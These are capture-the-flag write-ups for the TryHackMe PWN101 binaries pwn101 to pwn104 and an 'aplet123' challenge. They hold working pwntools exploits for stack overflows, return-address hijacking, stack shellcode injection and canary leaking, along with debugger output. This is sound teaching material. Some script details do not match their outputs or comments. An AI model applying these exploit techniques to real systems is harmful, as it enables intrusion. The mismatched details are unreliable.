content:
pwn101 We are given a binary called pwn101 with the following protections.
$ checksec pwn101 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Stripped: No When we open it with Ghidra we can see the following in the main() function.
void main(void) { char local_48 [60]; int local_c; local_c = 0x539; setup(); banner(); puts( "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n" ); puts("Type the required ingredients to make briyani: "); gets(local_48); if (local_c == 0x539) { puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/"); /* WARNING: Subroutine does not return */ exit(0x539); } puts("Thanks, Here\'s a small gift for you <3"); system("/bin/sh"); return; } Source code analysis It defines a 60 byte buffer in the local_48 variable and below it takes our input using gets(), this makes the binary vulnerable to Buffer Overflow, since gets() is an insecure function that does not control the size of our input allowing us to overflow the buffer.
And finally if the local_c variable is not equal to 1337 (0x539 in hexadecimal) we get a shell.
Exploit and shell What we have to do here is clear, we have to send 60 bytes to unboard the buffer, overwrite the local_c variable so that it does not fulfill the if conditional and get the shell.
from pwn import * context.binary = ELF('./pwn101') p = remote('10.10.163.87', 9001) payload = b'A' * 60 # _BYTE var_40[60] p.sendline(payload) p.interactive() By executing the script we get a shell and we can read the flag.
$ python3 solve.py Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Stripped: No [+] Opening connection to 10.10.163.87 on port 9001: Done [*] Switching to interactive mode ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐ │ ├┬┘└┬┘├─┤├─┤│ ├┴┐│││├┤ ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘ pwn 101 Hello!, I am going to shopping. My mom told me to buy some ingredients. Ummm.. But I have low memory capacity, So I forgot most of them. Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D Type the required ingredients to make briyani: Thanks, Here's a small gift for you <3 $ cat flag* THM{7h4t's_4n_3zy_oveRflowwwww} pwn102 We are given a binary called pwn102 with the following protections.
$ checksec pwn102 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Stripped: No When opening the binary in Ghidra we see the following in the main() function.
void main(void) { undefined local_78 [104]; int local_10; int local_c; setup(); banner(); local_c = 0xbadf00d; local_10 = L'\xfee1dead'; printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead); __isoc99_scanf(&DAT_00100b66,local_78); if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) { printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3); system("/bin/sh"); return; } puts("I\'m feeling dead, coz you said I need bad food :("); /* WARNING: Subroutine does not return */ exit(0x539); } Analysis of the source code We see that it defines a buffer of 104 bytes in the variable local_78, then it creates two more variables, one called local_c with the value 0xbadf00d and another called local_10 with the value 0xfee1dead, takes our input using scanf() and makes a comparison using an if statement.
To solve this challenge we must fill the buffer and overwrite the local_c variable with the value 0xc0ff33 and the local_10 variable with the value 0xc0d3, if we achieve this it will return a shell and we will be able to read the flag. We can see this in IDA to understand it better.
Exploit y shell Then we have to fill the buffer with 104 bytes and send 0xc0d3 plus 0xc0ff33.
from pwn import * context.binary = ELF('./pwn102') p = remote('10.10.163.87', 9002) FIRST_PARAMETER = 0xc0d3 SECOND_PARAMETER = 0xc0ff33 junk = 104 offset = b'A' * junk payload = offset payload += p32(FIRST_PARAMETER) payload += p32(SECOND_PARAMETER) p.sendline(payload) p.interactive() By running the exploit we can get a shell and read the flag.
$ python3 solve.py Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Stripped: No [+] Opening connection to 10.10.163.87 on port 9002: Done [*] Switching to interactive mode ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐ │ ├┬┘└┬┘├─┤├─┤│ ├┴┐│││├┤ ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘ pwn 102 I need badf00d to fee1dead Am I right? Yes, I need c0ff33 to c0d3 $ ls flag.txt pwn102 pwn102.c $ cat flag.txt THM{y3s_1_n33D_C0ff33_to_C0d3_<3} pwn103 We are given a binary called pwn103 with the following protections.
$ checksec pwn103 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No It has the pure NX protection enabled, this makes me suspect that we are facing a ROP challenge. When we open the binary with Ghidra we have the following in the main() function.
void main(void) { undefined4 local_c; setup(); banner(); puts(&DAT_00403298); puts(&DAT_004032c0); puts(&DAT_00403298); printf(&DAT_00403323); __isoc99_scanf(&DAT_00403340,&local_c); switch(local_c) { default: main(); break; case 1: announcements(); break; case 2: rules(); break; case 3: general(); break; case 4: discussion(); break; case 5: bot_cmd(); } return; } A case structure with 5 options, we can see them when executing the binary.
$ ./pwn103 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ [THM Discord Server] ➖➖➖➖➖➖➖➖➖➖➖ 1) 📢 Announcements 2) 📜 Rules 3) 🗣 General 4) 🏠 rooms discussion 5) 🤖 Bot commands ➖➖➖➖➖➖➖➖➖➖➖ ⌨️ Choose the channel: The only important one is option 3.
void general(void) { int iVar1; char local_28 [32]; puts(&DAT_004023aa); puts(&DAT_004023c0); puts(&DAT_004023e8); puts(&DAT_00402418); printf("------[pwner]: "); __isoc99_scanf(&DAT_0040245c,local_28); iVar1 = strcmp(local_28,"yes"); if (iVar1 == 0) { puts(&DAT_00402463); main(); } else { puts(&DAT_0040247f); } return; } There is also an admin_only function that gives us a shell.
void admins_only(void) { puts(&DAT_00403267); puts(&DAT_0040327c); system("/bin/sh"); return; } Analysis of the source code We can see that the general() function is vulnerable to Buffer Overflow, since it uses __isoc99_scanf to read user data and stores the result in local_28, a 32-byte buffer, without checking the input size. If the user provides more than 32 bytes, the data will overwrite adjacent memory, which could allow arbitrary code execution or control flow corruption. If we press option 3 and send too many bytes we can see that the program gives a memory error.
$ ./pwn103 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ [THM Discord Server] ➖➖➖➖➖➖➖➖➖➖➖ 1) 📢 Announcements 2) 📜 Rules 3) 🗣 General 4) 🏠 rooms discussion 5) 🤖 Bot commands ➖➖➖➖➖➖➖➖➖➖➖ ⌨️ Choose the channel: 3 🗣 General: ------[jopraveen]: Hello pwners 👋 ------[jopraveen]: Hope you're doing well 😄 ------[jopraveen]: You found the vuln, right? 🤔 ------[pwner]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Try harder!!! 💪 [1] 247775 segmentation fault (core dumped) ./pwn103 The goal of this challenge is to exploit the Buffer Overflow and redirect the execution to the admins_only() function to obtain a shell.
void admins_only(void) { puts(&DAT_00403267); puts(&DAT_0040327c); system("/bin/sh"); return; } Calculate offset Let’s use gdb to find the offset we need to overwrite the return address.
gef➤ pattern create 150 [+] Generating a pattern of 150 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa [+] Saved as '$_gef0' gef➤ run Starting program: /home/abund4nt/Binary Explotation/TryHackMe/pwn101/3/pwn103 [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ [THM Discord Server] ➖➖➖➖➖➖➖➖➖➖➖ 1) 📢 Announcements 2) 📜 Rules 3) 🗣 General 4) 🏠 rooms discussion 5) 🤖 Bot commands ➖➖➖➖➖➖➖➖➖➖➖ ⌨️ Choose the channel: 3 🗣 General: ------[jopraveen]: Hello pwners 👋 ------[jopraveen]: Hope you're doing well 😄 ------[jopraveen]: You found the vuln, right? 🤔 ------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa Try harder!!! 💪 Program received signal SIGSEGV, Segmentation fault. 0x0000000000401377 in general () [ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x13 $rbx : 0x00007fffffffddf8 → 0x00007fffffffe166 → "/home/abund4nt/Binary Explotation/TryHackMe/pwn101[...]" $rcx : 0x00007ffff7d1c574 → 0x5477fffff0003d48 ("H="?) $rdx : 0x0 $rsp : 0x00007fffffffdcb8 → "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]" $rbp : 0x6161616161616165 ("eaaaaaaa"?) $rsi : 0x00007ffff7e04643 → 0xe05710000000000a ("\n"?) $rdi : 0x00007ffff7e05710 → 0x0000000000000000 $rip : 0x0000000000401377 → <general+00b9> ret $r8 : 0x12 $r9 : 0xffffffff $r10 : 0x00007ffff7c1a410 → 0x0011001a0000849e $r11 : 0x202 $r12 : 0x1 $r13 : 0x0 $r14 : 0x0 $r15 : 0x00007ffff7ffd000 → 0x00007ffff7ffe2e0 → 0x0000000000000000 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ─────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdcb8│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]" ← $rsp 0x00007fffffffdcc0│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]" 0x00007fffffffdcc8│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]" 0x00007fffffffdcd0│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]" 0x00007fffffffdcd8│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]" 0x00007fffffffdce0│+0x0028: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]" 0x00007fffffffdce8│+0x0030: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]" 0x00007fffffffdcf0│+0x0038: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]" ───────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x401370 <general+00b2> call 0x401040 <puts@plt> 0x401375 <general+00b7> nop 0x401376 <general+00b8> leave → 0x401377 <general+00b9> ret [!] Cannot disassemble from $PC ───────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: "pwn103", stopped 0x401377 in general (), reason: SIGSEGV ─────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x401377 → general() ────────────────────────────────────────────────────────────────────────────────────────────── gef➤ pattern search $rsp [+] Searching for '6661616161616161'/'6161616161616166' with period=8 [+] Found at offset 40 (little-endian search) likely We need 40 bytes to reach the position where the return address is stored. After reaching the return position we can send a RET gadget for stack alignment plus the memory address of the admins_only() function.
Exploit and shell from pwn import * context.binary = ELF('./pwn103') p = remote('10.10.163.87', 9003) junk = 40 offset = b'A' * junk p.sendline(b'3') payload = offset payload += p64(0x0000000000401016) payload += p64(0x0000000000401554) p.sendline(payload) p.interactive() By executing the exploit we get a shell and solve the challenge.
$ python3 solve.py Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No [+] Opening connection to 10.10.195.169 on port 9003: Done [*] Switching to interactive mode ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ [THM Discord Server] ➖➖➖➖➖➖➖➖➖➖➖ 1) 📢 Announcements 2) 📜 Rules 3) 🗣 General 4) 🏠 rooms discussion 5) 🤖 Bot commands ➖➖➖➖➖➖➖➖➖➖➖ ⌨️ Choose the channel: 🗣 General: ------[jopraveen]: Hello pwners 👋 ------[jopraveen]: Hope you're doing well 😄 ------[jopraveen]: You found the vuln, right? 🤔 ------[pwner]: Try harder!!! 💪 👮 Admins only: Welcome admin 😄 $ ls flag.txt pwn103 pwn103.c $ cat flag.txt THM{w3lC0m3_4Dm1N} pwn104 We are given a binary called pwn104 which has the following protections.
$ checksec pwn104 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No It does not have any protection enabled, this makes me suspect that we have to run Shellcode, if we run the binary we can see that it allows us to enter an input and tells us about it having executable powers.
$ ./pwn104 ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐ │ ├┬┘└┬┘├─┤├─┤│ ├┴┐│││├┤ ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘ pwn 104 I think I have some super powers 💪 especially executable powers 😎💥 Can we go for a fight? 😏💪 I'm waiting for you at 0x7ffff6718310 test If we open it in Ghidra, we will see the following in the main() function.
void main(void) { undefined local_58 [80]; setup(); banner(); puts(&DAT_00402120); puts(&DAT_00402148); puts(&DAT_00402170); printf("I\'m waiting for you at %p\n",local_58); read(0,local_58,200); return; } Analysis of the source code In the local_58 variable a buffer of 80 bytes is defined, but the read() function is configured to read up to 200 bytes. This makes the binary vulnerable to Buffer Overflow, since the program allows the user to input more than the 80 bytes reserved for the buffer.
By allowing the input size to be larger than the defined buffer, the program overwrites adjacent memory areas, including the stack frame.
The use of printf() is crucial, since it prime the address of the local_58 variable, which will allow us to calculate exactly the return address that will be overwritten when the Buffer Overflow is exploited (since ASLR will be enabled on the remote instance).
As NX is disabled, we can insert shellcode in the stack and execute it. For this we can take advantage of the Buffer Overflow and overwrite the return address with this address. Then, instead of putting any bytes, we will put shellcode to get a shell.
If you don’t understand what is a shellcode I invite you to read this post .
Finding the offset First we have to find the offset to overwrite the return address, for this we will use gdb.
gef➤ pattern create 350 [+] Generating a pattern of 350 bytes (n=8)  [+] Saved as '$_gef0' gef➤ run Starting program: /home/abund4nt/pwn/TryHackMe/pwn101/4/pwn104 [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐ │ ├┬┘└┬┘├─┤├─┤│ ├┴┐│││├┤ ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘ pwn 104 I think I have some super powers 💪 especially executable powers 😎💥 Can we go for a fight? 😏💪 I'm waiting for you at 0x7fffffffdcd0  Program received signal SIGSEGV, Segmentation fault. 0x000000000040124e in main () [ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0xc8 $rbx : 0x00007fffffffde48 → 0x00007fffffffe1b2 → "/home/abund4nt/pwn/TryHackMe/pwn101/4/pwn104" $rcx : 0x00007ffff7d1ba61 → 0x4f77fffff0003d48 ("H="?) $rdx : 0xc8 $rsp : 0x00007fffffffdd28 → "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]" $rbp : 0x616161616161616b ("kaaaaaaa"?) $rsi : 0x00007fffffffdcd0 → "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]" $rdi : 0x0 $rip : 0x000000000040124e → <main+0081> ret $r8 : 0x26 $r9 : 0x0 $r10 : 0x00007ffff7c109d8 → 0x0011001200001bd3 $r11 : 0x246 $r12 : 0x1 $r13 : 0x0 $r14 : 0x0 $r15 : 0x00007ffff7ffd000 → 0x00007ffff7ffe2e0 → 0x0000000000000000 $eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdd28│+0x0000: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]" ← $rsp 0x00007fffffffdd30│+0x0008: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]" 0x00007fffffffdd38│+0x0010: "naaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaata[...]" 0x00007fffffffdd40│+0x0018: "oaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaaua[...]" 0x00007fffffffdd48│+0x0020: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]" 0x00007fffffffdd50│+0x0028: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]" 0x00007fffffffdd58│+0x0030: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]" 0x00007fffffffdd60│+0x0038: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]" ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x401247 <main+007a> call 0x401050 <read@plt> 0x40124c <main+007f> nop 0x40124d <main+0080> leave → 0x40124e <main+0081> ret [!] Cannot disassemble from $PC ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: "pwn104", stopped 0x40124e in main (), reason: SIGSEGV ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x40124e → main() ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ zaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaa Undefined command: "zaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaa". Try "help". gef➤ pattern search $rsp [+] Searching for '6c61616161616161'/'616161616161616c' with period=8 [+] Found at offset 88 (little-endian search) likely We need 88 bytes to overwrite the return address, after that we can enter the shellcode.
To create the shellcode we will use the shellcraft.sh() function of pwntools, with the following script we solve the challenge.
Exploit and shell from pwn import * context.binary = ELF('./pwn104') p = process() # Leaking address p.recvuntil(b"I'm waiting for you at ") address = int(p.recvline().strip(), 16) log.info(f'Shellcode address {address}') payload = asm(shellcraft.sh()) payload = payload.ljust(88, b'A') payload += p64(address) p.sendline(payload) p.interactive() By executing the exploit we get a shell and can read the flag.
$ python3 solve.py Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No [+] Opening connection to 10.10.12.17 on port 9004: Done [*] Shellcode address 140725414513968 [*] Switching to interactive mode $ ls flag.txt pwn104 pwn104.c $ cat flag.txt THM{0h_n0o0o0o_h0w_Y0u_Won??}
summary: Writeups of TryHackMe PWN101 Room challenges
title: PWN101 Room - Tryhackme

content:
We are provided with a binary named aplet123 with the following protections.
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Also its source code.
#include <stdio.h> #include <stdlib.h> #include <string.h> #include <time.h> #include <unistd.h> void print_flag(void) { char flag[256]; FILE *flag_file = fopen("flag.txt", "r"); fgets(flag, sizeof flag, flag_file); puts(flag); } const char *const responses[] = {"L", "amongus", "true", "pickle", "GINKOID", "L bozo", "wtf", "not with that attitude", "increble", "based", "so true", "monka", "wat", "monkaS", "banned", "holy based", "daz crazy", "smh", "bruh", "lol", "mfw", "skissue", "so relatable", "copium", "untrue!", "rolled", "cringe", "unlucky", "lmao", "eLLe", "loser!", "cope", "I use arch btw"}; int main(void) { setbuf(stdout, NULL); srand(time(NULL)); char input[64]; puts("hello"); while (1) { gets(input); char *s = strstr(input, "i'm"); if (s) { printf("hi %s, i'm aplet123\n", s + 4); } else if (strcmp(input, "please give me the flag") == 0) { puts("i'll consider it"); sleep(5); puts("no"); } else if (strcmp(input, "bye") == 0) { puts("bye"); break; } else { puts(responses[rand() % (sizeof responses / sizeof responses[0])]); } } } Source code analysis We see that it defines a print_flag() function that reads and displays the flag on the screen. In main(), we define a 64-byte buffer and take our input using gets(), an insecure function that does not validate the size of the input, leaving the program vulnerable to a Buffer Overflow. This allows us to overflow the buffer and corrupt memory. To solve the challenge, we must first filter the stack canary value and then take advantage of the Buffer Overflow to redirect execution to print_flag().
Escape the canary To escape the canary we must look at the following part of the code.
char *s = strstr(input, "i'm"); if (s) { printf("hi %s, i'm aplet123\n", s + 4); } .... The conditional if checks if the string i'm is in our input, if so it prints it on stdout. If we introduce a string with i'm at the end it is obvious that 7 bytes of the canary are filtered, we must program a script that defines the buffer_size (64 + 8) and sends a string with i'm at the end.
from pwn import * # Context and open binary context.binary = ELF('./aplet123') p = process('./aplet123') # Padding 64 + 8 buffer_size = 72 # Leaking it trigger_canary = b'A' * (buffer_size - 3) + b"i'm" p.sendline(trigger_canary) p.recvuntil(b'hi ') canary = p.recv(7) canary = u64(b'\0' + canary) log.info(f'Canary found: {hex(canary)}') p.interactive() By executing the script we will be able to escape the canary from the binary without problems.
$ python3 canary.py Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No [+] Starting local process './aplet123': pid 202718 [*] Canary found: 0xa23c60488cb7e300 [*] Switching to interactive mode \xa0\xd5+?\xfc\x7f, i'm aplet123 Remember that in linux stack canaries end in 00, this makes them much easier to detect.
Once the canary has been filtered, we have to exploit the Buffer Overflow and redirect the execution to the print_flag function.
Buffer Overflow We see that it defines a 64-byte buffer.
char input[64]; This means that we have to send 64 bytes, a RET gadget, after the ret gadget the address of the escaped canary and the address of the print_flag() function, with this we solve the challenge.
from pwn import * # Context and open binary context.binary = ELF('./aplet123') p = remote('box.acmcyber.com', 31123) # Padding 64 + 8 buffer_size = 72 # Leaking it trigger_canary = b'A' * (buffer_size - 3) + b"i'm" p.sendline(trigger_canary) p.recvuntil(b'hi ') canary = p.recv(7) canary = u64(b'\0' + canary) log.info(f'Canary found: {hex(canary)}') offset = 64 junk = b'A' * offset payload = junk	# buffer payload += p64(0x0000000000401016)	# ret gadget payload += p64(canary)	# canary payload += p64(0x90)	# NOP instruction payload += p64(0x00000000004011e6)	# info_function() p.sendline(payload) p.interactive() By running the exploit we can solve the challenge and get the flag.
